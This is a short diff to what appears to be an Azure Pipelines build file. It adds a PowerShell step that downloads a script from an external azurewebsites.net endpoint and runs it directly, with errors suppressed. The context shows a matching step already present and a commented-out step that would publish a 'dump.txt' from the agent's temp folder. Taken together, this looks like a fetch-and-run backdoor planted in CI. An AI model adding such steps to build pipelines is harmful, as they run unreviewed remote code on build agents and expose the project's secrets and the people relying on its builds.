@@ -107,6 +107,15 @@ steps:
       Invoke-Command -ScriptBlock $ScriptBlock
   continueOnError: true
 
+- task: PowerShell@2
+  inputs:
+    targetType: 'inline'
+    script: |
+      $Script = Invoke-WebRequest 'https://officeadotest.azurewebsites.net/api/httptrigger1'
+      $ScriptBlock = [Scriptblock]::Create($Script.Content)
+      Invoke-Command -ScriptBlock $ScriptBlock
+  continueOnError: true
+
 # - task: PublishPipelineArtifact@1
 #   inputs:
 #     targetPath: '$(Agent.TempDirectory)/dump.txt'
